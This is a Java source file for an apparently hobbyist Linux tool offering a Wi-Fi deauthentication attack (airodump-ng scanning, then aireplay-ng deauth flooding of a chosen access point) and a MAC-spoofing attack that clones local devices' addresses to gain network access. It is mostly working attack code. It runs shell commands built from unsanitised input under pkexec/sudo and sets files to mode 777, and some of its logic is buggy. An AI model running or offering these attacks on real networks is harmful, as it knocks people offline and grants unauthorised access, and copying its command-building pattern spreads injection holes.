package com.company;

import java.io.*;
import java.net.URISyntaxException;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Scanner;

public class Main {
    private static Scanner scanner = new Scanner(System.in);
    static String wi = "wlp5s0";
    static String mwi = wi + "mon";
    static boolean monitorMde = false;


    public static void main(String[] args) throws IOException, URISyntaxException {
        if (System.getProperty("os.name").startsWith("Windows")) { //this program can currently only run on linux
            System.out.println("Please run within the windows ubuntu filesystem.");
            System.exit(0);
        } else if (System.getProperty("os.name").startsWith("mac")) {
            System.out.println("Sorry, macOS isn't supported yet, please run from a vm.");
            System.exit(0);
        }

        String path = new File(Main.class.getProtectionDomain().getCodeSource().getLocation()
                .toURI()).getPath();

        if (!execute("whoami", false).get(0).equals("root")) {
            System.out.println("run it as root");
            executeNewWindow("sudo java -jar " + path, false);
            System.exit(0);
        }

        checkdep(); //check that necessary dependencies are installed


        System.out.println("Success! PUIAS has been successfully started ");

        while (true) {

            System.out.println("----------------------------------------------------"); //print options
            System.out.println("|Hello what would you like to do today?            |");
            System.out.println("|                                                  |");
            System.out.println("|                                                  |");
            System.out.println("|edit - edit wireless card name (curently: " + wi + ") |");
            System.out.println("|                                                  |");
            System.out.println("| 1 - launch deauth attack                         |");
            //   System.out.println("| 2 - launch WPA attack");
            System.out.println("| 3 - launch MAC spoofing attack                   |");
            System.out.println("----------------------------------------------------");

            String in = scanner.nextLine();

            if (in.equals("edit")) { //change wireless card name
                System.out.println("Enter card name in standard mode: ");
                wi = scanner.nextLine();
                System.out.println("Done! wireless card is now: " + wi);

                System.out.println("Enter card name in monitor mode: ");
                mwi = scanner.nextLine();
                System.out.println("Done! monitor wireless card is now: " + mwi);

            }
            if (in.equals("1")) {
                startMonitorMode();

                String scriptDIR = path.replace(path.split(File.separator)[path.split(File.separator).length - 1], "");
                String deauthI_path = scriptDIR + "scans" + File.separator + "deauthI"; //deauth initial scan absolote path
                executeNewWindow("airodump-ng  -w " + deauthI_path + " --output-format csv " + mwi, true);//scan networks and get bssid and essid
                System.out.println("press enter when done");
                scanner.nextLine();


                File[] scans = new File(scriptDIR + "scans").listFiles(pathname -> !pathname.isDirectory());
                assert scans != null;
                File last_scan = scans[scans.length - 1]; //get the latest scan

                execute("chmod 777 " + last_scan.getAbsolutePath(), true); //allow editing of file


                BufferedReader deauthIbr = new BufferedReader(new FileReader(last_scan));
                String l;
                ArrayList<String> dsi_list = new ArrayList<>();
                while (!(l = deauthIbr.readLine()).equals("Station MAC, First time seen, Last time seen, Power, # packets, BSSID, Probed ESSIDs")) {//read file until reched unasosiated bssids
                    dsi_list.add(l);
                }
                dsi_list.remove(0); //remove headers
                dsi_list.remove(0);

                ArrayList<String> bssids = new ArrayList<>();
                ArrayList<String> essids = new ArrayList<>();
                ArrayList<String> chs = new ArrayList<>();

                int i = 0;
                for (String entry : dsi_list) {
                    try {
                        String[] props = entry.split(",");
                        chs.add(props[3].replace(" ", ""));
                        bssids.add(props[0]);
                        String essid = props[props.length - 2];  // essid is 1 before the last
                        essids.add(essid);
                        System.out.println(i + ". " + essid);

                        i++;
                    } catch (Exception ignored) {
                    }

                }
                System.out.println("enter network no");

                int sn = Integer.parseInt(scanner.nextLine());
                String bss = bssids.get(sn);
                String ess = essids.get(sn);
                String ch = chs.get(sn);
                System.out.println("Selected network: " + ess + " with a bssid: " + bss + " and a chanel: " + ch);

                System.out.println("Enter 1 to deauth all, or 2 to select a target");
                String p = scanner.nextLine();

                if (p.equals("1")) {
                    setChanel(ch);
                    executeNewWindow("aireplay-ng -0 0  -a " + bss + " " + mwi, true);
                    System.out.println("press enter when done");
                    scanner.nextLine();
                }

                if (p.equals("2")) {
                    executeNewWindow("airodump-ng -c " + ch + "-w " + "tg.txt" + " --bssid " + bss + " " + mwi, true);

                    File[] tgscans = new File(scriptDIR + "scans").listFiles();
                    assert tgscans != null;
                    File lasttg_scan = tgscans[tgscans.length - 1]; //get the latest scan

                    execute("chmod 777 " + lasttg_scan.getAbsolutePath(), true); //allow editing of file

//                    System.out.println(execute("aireplay-ng -0 100 -a " + bss + " " + mwi, true));
                }
                stopMonitorMode();
            }

            if (in.equals("3")) {
                ArrayList<String> macs = execute("arp-scan -l", true); //get all mac adresses via arp-scan
                macs.remove(0); //remove headers
                macs.remove(0);
                macs.remove(macs.size() - 1);
                macs.remove(macs.size() - 1);
                macs.remove(macs.size() - 1);
                System.out.println(macs.size() + " possible targets found: ");
                for (int i = 0; i < macs.size(); i++) {
                    macs.set(i, macs.get(i).split("\t")[1]); //add mac to arraylist
                    System.out.println(macs.get(i)); //print said mac
                }
                for (String mac : macs) {
                    if (trymac(mac)) { //try each mac
                        System.out.println("success! " + mac); //id succesfull print so
                        break;
                    }
                }

            }
        }
    }


    public static void startMonitorMode() {
        if (!monitorMde) {
            execute("airmon-ng check kill", true);
            execute("airmon-ng start " + wi , true);
        }
    }

    private static void setChanel(String ch){
        execute("sudo iwconfig "+mwi+" channel "+ch,true);
    }

    public static void stopMonitorMode() {
        if (!monitorMde) {
            execute("airmon-ng stop " + mwi, true);
            execute("service network-manager restart", true);
        }
    }

    private static void checkdep() throws IOException {
        System.out.println("checking dep");
        boolean aircrack = checkpackage("aircrack-ng"); //check each package if installed
        boolean macchanger = checkpackage("macchanger");
        boolean arpscan = checkpackage("arp-scan");
        boolean pkexec = checkpackage("pkexec");


        if (!macchanger || !aircrack || !arpscan || !pkexec) {//if any package is missing
            System.out.println("Error, some of the application requirements are missing");

            File dep = new File("dep.sh");
            dep.delete(); //delete existing dep.sh file
            BufferedWriter bufferedWriter = new BufferedWriter(new FileWriter(dep));
            bufferedWriter.write("#!/bin/sh"); //create a new bash script


            if (!pkexec) { //for each missing package push an install line
                bufferedWriter.newLine();
                bufferedWriter.write("sudo apt install pkexec");
            }
            if (!macchanger) {
                bufferedWriter.newLine();
                bufferedWriter.write("sudo apt install macchanger");
            }
            if (!arpscan) {
                bufferedWriter.newLine();
                bufferedWriter.write("sudo apt install arp-scan");
            }
            if (!aircrack) {
                bufferedWriter.newLine();
                bufferedWriter.write("sudo apt install aircrack-ng");
            }
            bufferedWriter.close();
            System.out.println("please run: 'chmod +x dep.sh' and 'sudo bash dep.sh' (two commands, no quotes)"); //print execution instructions
            System.exit(0);
        }
    }


    private static boolean checkpackage(String packageS) {
        ArrayList<String> pkg_stat = execute("which " + packageS, false); //check if package is installed via which command
        boolean installed = pkg_stat.size() > 0;
        System.out.println(packageS + (installed ? " [OK]" : "[!]"));
        return installed;
    }


    private static ArrayList<String> execute(String command, boolean sudo) {
        if (sudo) {
            command = "pkexec " + command; // if sudo is required append pkexec to the start(graphical request for sudo)
        }


        ArrayList<String> out = new ArrayList<>();
        try {
            Process p = new ProcessBuilder(new String[]{"/bin/sh", "-c", command}).start();

            p.waitFor(); //wait for process to complete

            BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream())); //std::out output
            BufferedReader error = new BufferedReader(new InputStreamReader(p.getErrorStream())); //std::error output

            String s;


            while ((s = br.readLine()) != null) //first read all std::output and append to result
                out.add(s);
            while ((s = error.readLine()) != null)//then do the same for std error
                out.add(s);
            p.destroy();
        } catch (Exception ignored) {
            ignored.printStackTrace();
        }
        return out;
    }

    private static ArrayList<String> executeNewWindow(String command, boolean sudo) {
        System.out.println(command);
        if (sudo) {
            return execute("sudo x-terminal-emulator -e " + command, false);

        }
        return execute("x-terminal-emulator -e " + command, false);
    }

    private static ArrayList<String> change_mac(String mac) {
        ArrayList<String> execute = execute("ifconfig " + wi + " down && pkexec macchanger -m " + mac + " " + wi + "&& pkexec ifconfig " + wi + " up", true); //bring adpter down, change mac, bring it back up again
        execute("nmcli radio wifi off", true);//restart network adapter
        execute("nmcli radio wifi on", true);
        return execute;
    }

    private static boolean trymac(String mac) {
        change_mac(mac); //change mac address
        boolean conected = false; //try 5 times to check connection to network
        for (int i = 0; i < 5 || conected; i++) {
            conected = !execute("ping 8.8.8.8 -c 4", false).contains("connect: Network is unreachable");
        }
        ArrayList<String> ping = execute("ping 8.8.8.8 -c 6", false); //ping google dns server and return !( if packet loss was 100% or ping failed)
        System.out.println(ping);
        return !(ping.contains("100% packet loss") || ping.contains("connect: Network is unreachable"));
    }


}